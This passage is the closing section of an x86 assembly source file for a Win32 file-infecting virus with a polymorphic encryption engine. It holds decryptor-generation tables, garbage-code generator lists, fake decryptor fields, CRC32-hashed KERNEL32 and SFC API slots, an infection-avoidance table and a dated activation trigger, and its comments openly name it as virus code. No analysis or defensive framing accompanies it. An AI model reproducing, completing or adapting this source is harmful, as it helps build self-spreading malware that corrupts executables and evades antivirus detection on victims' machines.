   xx_inc_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 00h
                   db 00h
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   xx_dec_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 08h
                   db 00h
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   xx_not_reg      db 0F6h
                   db MAGIC_CAREEBP
                   db 10h
                   db 00h
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   xx_add_reg      db 80h
                   db MAGIC_CAREEBP
                   db 00h
                   db MAGIC_PUTKEY
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   xx_sub_reg      db 80h
                   db MAGIC_CAREEBP
                   db 28h
                   db MAGIC_PUTKEY
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   xx_xor_reg      db 80h
                   db MAGIC_CAREEBP
                   db 30h
                   db MAGIC_PUTKEY
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   yy_inc_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 80h
                   db MAGIC_PUTDISP
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   yy_dec_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 88h
                   db MAGIC_PUTDISP
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   yy_not_reg      db 0F6h
                   db MAGIC_NOTEBP
                   db 90h
                   db MAGIC_PUTDISP
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   yy_add_reg      db 80h
                   db MAGIC_NOTEBP
                   db 80h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   yy_sub_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0A8h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   yy_xor_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0B0h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   zz_inc_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 04h
                   db 00h
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   zz_dec_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 0Ch
                   db 00h
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   zz_not_reg      db 0F6h
                   db MAGIC_CAREEBP
                   db 14h
                   db 00h
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   zz_add_reg      db 80h
                   db MAGIC_CAREEBP
                   db 04h
                   db MAGIC_PUTKEY
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   zz_sub_reg      db 80h
                   db MAGIC_CAREEBP
                   db 2Ch
                   db MAGIC_PUTKEY
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   zz_xor_reg      db 80h
                   db MAGIC_CAREEBP
                   db 34h
                   db MAGIC_PUTKEY
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   ii_inc_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 84h
                   db MAGIC_PUTDISP
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   ii_dec_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 8Ch
                   db MAGIC_PUTDISP
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   ii_not_reg      db 0F6h
                   db MAGIC_NOTEBP
                   db 94h
                   db MAGIC_PUTDISP
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   ii_add_reg      db 80h
                   db MAGIC_NOTEBP
                   db 84h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   ii_sub_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0ACh
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   ii_xor_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0B4h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

                   ;------------------------------------------------------------
                   ;Reverse-code strings
                   ;------------------------------------------------------------

   x_inc_reg_byte  db 02h,0FEh,0C8h,MAGIC_ENDSTR
   x_inc_reg_word  db 02h,66h,48h,MAGIC_ENDSTR
   x_inc_reg_dword db 01h,48h,MAGIC_ENDSTR
   x_dec_reg_byte  db 02h,0FEh,0C0h,MAGIC_ENDSTR
   x_dec_reg_word  db 02h,66h,40h,MAGIC_ENDSTR
   x_dec_reg_dword db 01h,40h,MAGIC_ENDSTR
   x_not_reg_byte  db 02h,0F6h,0D0h,MAGIC_ENDSTR
   x_not_reg_word  db 03h,66h,0F7h,0D0h,MAGIC_ENDSTR
   x_not_reg_dword db 02h,0F7h,0D0h,MAGIC_ENDSTR
   x_add_reg_byte  db 01h,2Ch,MAGIC_ENDKEY
   x_add_reg_word  db 02h,66h,2Dh,MAGIC_ENDKEY
   x_add_reg_dword db 01h,2Dh,MAGIC_ENDKEY
   x_sub_reg_byte  db 01h,04h,MAGIC_ENDKEY
   x_sub_reg_word  db 02h,66h,05h,MAGIC_ENDKEY
   x_sub_reg_dword db 01h,05h,MAGIC_ENDKEY
   x_xor_reg_byte  db 01h,34h,MAGIC_ENDKEY
   x_xor_reg_word  db 02h,66h,35h,MAGIC_ENDKEY
   x_xor_reg_dword db 01h,35h,MAGIC_ENDKEY

                   ;------------------------------------------------------------
                   ;Format for each style-table entry:
                   ;
                   ; 00h -> DWORD -> Address of generator
                   ; 04h -> DWORD -> Address of generated subroutine or
                   ;                 00000000h if not yet generated
                   ;
                   ;------------------------------------------------------------

   style_table     equ $

                   dd offset gen_load_ptr
                   dd 00000000h

                   dd offset gen_load_ctr
                   dd 00000000h

                   dd offset gen_decrypt
                   dd 00000000h

                   dd offset gen_next_step
                   dd 00000000h

                   dd offset gen_next_ctr
                   dd 00000000h

                   ;------------------------------------------------------------
                   ;Garbage code generators
                   ;------------------------------------------------------------

   tbl_garbage     equ $

                   dd offset gen_save_code     ;clc stc cmc cld std
                   dd offset g_movreg32imm         ;mov reg32,imm
                   dd offset g_movreg16imm         ;mov reg16,imm
                   dd offset g_movreg8imm          ;mov reg8,imm
           dd offset g_xchgregreg32    ;xchg reg32,reg32
           dd offset g_xchgregreg16    ;xchg reg16,reg16
           dd offset g_xchgregreg8     ;xchg reg8,reg8
                   dd offset g_movregreg32         ;mov reg32,reg32
                   dd offset g_movregreg16         ;mov reg16,reg16
           dd offset g_movregreg8          ;mov reg8,reg8
           dd offset g_inc_reg32       ;inc reg32
           dd offset g_inc_reg16       ;inc reg16
           dd offset g_inc_reg8        ;inc reg8
           dd offset g_dec_reg32       ;dec reg32
           dd offset g_dec_reg16       ;dec reg16
           dd offset g_dec_reg8        ;dec reg8
                   dd offset g_mathregimm32        ;math reg32,imm
                   dd offset g_mathregimm16        ;math reg16,imm
                   dd offset g_mathregimm8         ;math reg8,imm
                   dd offset g_movzx_movsx         ;movzx/movsx reg32,reg16

   save_space  equ $

           dd offset gen_mov_mem32     ;mov mem,reg32
           dd offset gen_mov_mem16     ;mov mem,reg16
           dd offset gen_mov_mem8      ;mov mem,reg8
           dd offset gen_add_mem32     ;add mem,reg32
           dd offset gen_add_mem16     ;add mem,reg16
           dd offset gen_add_mem8      ;add mem,reg8
           dd offset gen_sub_mem32     ;sub mem,reg32
           dd offset gen_sub_mem16     ;sub mem,reg16
           dd offset gen_sub_mem8      ;sub mem,reg8
           dd offset gen_adc_mem32     ;adc mem,reg32
           dd offset gen_adc_mem16     ;adc mem,reg16
           dd offset gen_adc_mem8      ;adc mem,reg8
           dd offset gen_sbb_mem32     ;sbb mem,reg32
           dd offset gen_sbb_mem16     ;sbb mem,reg16
           dd offset gen_sbb_mem8      ;sbb mem,reg8
           dd offset gen_or_mem32      ;or mem,reg32
           dd offset gen_or_mem16      ;or mem,reg16
           dd offset gen_or_mem8       ;or mem,reg8
           dd offset gen_and_mem32     ;and mem,reg32
           dd offset gen_and_mem16     ;and mem,reg16
           dd offset gen_and_mem8      ;and mem,reg8
           dd offset gen_xor_mem32     ;xor mem,reg32
           dd offset gen_xor_mem16     ;xor mem,reg16
           dd offset gen_xor_mem8      ;xor mem,reg8
                   dd offset g_push_g_pop          ;push reg/garbage/pop reg
                   dd offset g_call_cont           ;call/garbage/pop
                   dd offset g_jump_u              ;jump/rnd block
                   dd offset g_jump_c              ;jump conditional/garbage
           dd offset gen_fake_crypt    ;fake decryptor instruction

   end_garbage     equ $

                   ;------------------------------------------------------------
           ;Generators of code that does not change register contents
                   ;------------------------------------------------------------

   tbl_free        equ $

               dd offset g_save_jump
               dd offset gen_save_code

   end_free        equ $

   ;----------------------------------------------------------------------------
   ;CRC32 of API names
   ;----------------------------------------------------------------------------

   CrcKernel32     dd 00000000h ;CRC32 of KERNEL dll name

   CrcGetProcAddr      dd 00000000h ;This API takes special care

   CRC32K32Apis        dd NumK32Apis dup (00000000h)

   CRC32SFCApis        dd NumSFCApis dup (00000000h)

   ;----------------------------------------------------------------------------
   ;Avoid some files from being infected
   ;----------------------------------------------------------------------------

   avoid_tbl       dd avoid_num dup (00000000h)

   ;----------------------------------------------------------------------------
   ;Activation date/time for this virus copy
   ;----------------------------------------------------------------------------

   activate_month      dw 0000h
   activate_day        dw 0000h
   activate_hour       dw 0000h

   ;----------------------------------------------------------------------------
   ;End of CRC32 protected area
   ;----------------------------------------------------------------------------

   SizeOfProtect       equ $-CRC_protected

   ;----------------------------------------------------------------------------
   ;End of virus image in files
   ;----------------------------------------------------------------------------

   inf_size        equ $-viro_sys

   ;----------------------------------------------------------------------------
   ;Seed for random number generator
   ;----------------------------------------------------------------------------

   rnd32_seed          dd 00000000h

   ;----------------------------------------------------------------------------
   ;CRC32 lookup table
   ;----------------------------------------------------------------------------

   tbl_crc32       dd 0100h dup (00000000h)

   ;----------------------------------------------------------------------------
   ;KERNEL32 API's
   ;----------------------------------------------------------------------------

   ;GetProcAddress API takes special care

   a_GetProcAddress    dd 00000000h

   epK32Apis       equ $

   a_CreateFileA       dd 00000000h
   a_CreateFileMappingA    dd 00000000h
   a_CloseHandle       dd 00000000h
   a_FindClose     dd 00000000h
   a_FindFirstFileA    dd 00000000h
   a_FindNextFileA     dd 00000000h
   a_FreeLibrary       dd 00000000h
   a_GetCurrentDirectoryA  dd 00000000h
   a_GetCurrentProcess dd 00000000h
   a_GetFileAttributesA    dd 00000000h
   a_GetLocalTime      dd 00000000h
   a_GetSystemDirectoryA   dd 00000000h
   a_GetVersionEx      dd 00000000h
   a_GetWindowsDirectoryA  dd 00000000h
   a_LoadLibraryA      dd 00000000h
   a_MapViewOfFile     dd 00000000h
   a_SetEndOfFile      dd 00000000h
   a_SetFileAttributesA    dd 00000000h
   a_SetFilePointer    dd 00000000h
   a_SetFileTime       dd 00000000h
   a_UnmapViewOfFile   dd 00000000h
   a_VirtualAlloc      dd 00000000h
   a_WriteProcessMemory    dd 00000000h

   NumK32Apis      equ ($-epK32Apis)/04h

   hKERNEL32       dd 00000000h

   ;----------------------------------------------------------------------------
   ;This buffer resides here because is used before memory allocation
   ;----------------------------------------------------------------------------

   BufStrFilename      db MAX_PATH dup (00000000h)

   ;----------------------------------------------------------------------------
   ;End of virus virtual image
   ;----------------------------------------------------------------------------

   size_virtual        equ $-viro_sys

   ;----------------------------------------------------------------------------
   ;ADVAPI32.DLL APIs used by the virus
   ;----------------------------------------------------------------------------

   epSFCApis       equ $

   a_SfcIsFileProtected    dd 00000000h

   NumSFCApis      equ ($-epSFCApis)/04h

   hSFCDLL         dd 00000000h

   ;----------------------------------------------------------------------------
   ;Misc variables
   ;----------------------------------------------------------------------------

   map_is_here     dd 00000000h
   FileImport      dd 00000000h
   ImportSH        dd 00000000h
   inject_offs     dd 00000000h
   vir_offset      dd 00000000h
   search_raw      dd 00000000h
   host_base       dd 00000000h
   virus_sh        dd 00000000h
   fix_size        dd 00000000h
   raw_align       dd 00000000h
   K32CodeStart        dd 00000000h
   K32CodeEnd      dd 00000000h
   KeySize         dd 00000000h
   KeyValue        dd 00000000h

   NumInfected     db 00

   ;----------------------------------------------------------------------------
   ;Poly engine uninitialized data
   ;----------------------------------------------------------------------------

   CRYPT_DIRECTION equ 01h
   CRYPT_CMPCTR    equ 02h
   CRYPT_CDIR      equ 04h
   CRYPT_SIMPLEX   equ 10h
   CRYPT_COMPLEX   equ 20h

   PtrToCrypt  dd 00000000h    ;Pointer to area to encrypt
   PtrToDecrypt    dd 00000000h    ;Where to generate polymorphic decryptor
   PtrToEP     dd 00000000h    ;Pointer to code entry-point once decrypted
   SizeCrypt   dd 00000000h    ;Size of area to encrypt
   end_value       dd 00000000h    ;Index end value
   loop_point      dd 00000000h    ;Start address of decryption loop
   entry_point     dd 00000000h    ;Entry point to decryptor code
   decryptor_size  dd 00000000h    ;Size of generated decryptor
   disp2disp   dd 00000000h    ;Displacement over displacement

   counter_mask    db 00h              ;Mask of register used as counter
   recursive_level db 00h              ;Garbage recursive layer
   IsFirst     db 00h          ;Save registers only on 1st decryptor

   fake_field          equ $

   ptr_disp        dd 00000000h    ;Displacement from index
   fake_ptr_disp       dd 00000000h    ;...and fake one

   crypt_key       dd 00000000h    ;Encryption key
   fake_crypt_key      dd 00000000h    ;...and fake one

   build_flags     db 00h          ;Some decryptor flags
   fake_build_flags    db 00h      ;...and fake ones

   oper_size       db 00h          ;Size used (1=Byte 2=Word 4=Dword)
   fake_oper_size      db 00h      ;...and fake one

   index_mask      db 00h          ;Mask of register used as index
   fake_index_mask     db 00h      ;...and fake one

   NUM_DA          equ 10h

   NumberOfDataAreas   db 00h

   tbl_data_area       db NUM_DA*08h dup (00h)

   ;----------------------------------------------------------------------------
   ;Structure used by GetVersionEx
   ;----------------------------------------------------------------------------

   system_version      equ $

   dwOSVersionInfoSize dd 00000000h
   dwMajorVersion      dd 00000000h
   dwMinorVersion      dd 00000000h
   dwBuildNumber       dd 00000000h
   dwPlatformId        dd 00000000h

   szCSDVersion        db 80h dup (00h)

   ;----------------------------------------------------------------------------
   ;SYSTEMTIME structure used by GetLocalTime
   ;----------------------------------------------------------------------------

   local_time      equ $

   LT_Year         dw 0000h
   LT_Month        dw 0000h
   LT_DayOfWeek        dw 0000h
   LT_Day          dw 0000h
   LT_Hour         dw 0000h
   LT_Minute       dw 0000h
   LT_Second       dw 0000h
   LT_Milliseconds     dw 0000h

   ;----------------------------------------------------------------------------
   ;Information about currently opened file
   ;----------------------------------------------------------------------------

   CurFileAttr     dd 00000000h
   h_CreateFile        dd 00000000h
   h_FileMap       dd 00000000h
   h_Key           dd 00000000h

   ;----------------------------------------------------------------------------
   ;This is a WIN32 FindData structure used to infect files
   ;----------------------------------------------------------------------------

   h_Find          dd 00000000h
   DirectFindData      db SIZEOF_WIN32_FIND_DATA dup (00h)

   ;----------------------------------------------------------------------------
   ;Used to retrieve current, windows and system directories
   ;----------------------------------------------------------------------------

   BufGetDir       db MAX_PATH dup (00000000h)

   ;----------------------------------------------------------------------------
   ;End of virus image in allocated memory
   ;----------------------------------------------------------------------------

   alloc_size      equ $-viro_sys

   virseg          ends
                   end host_code
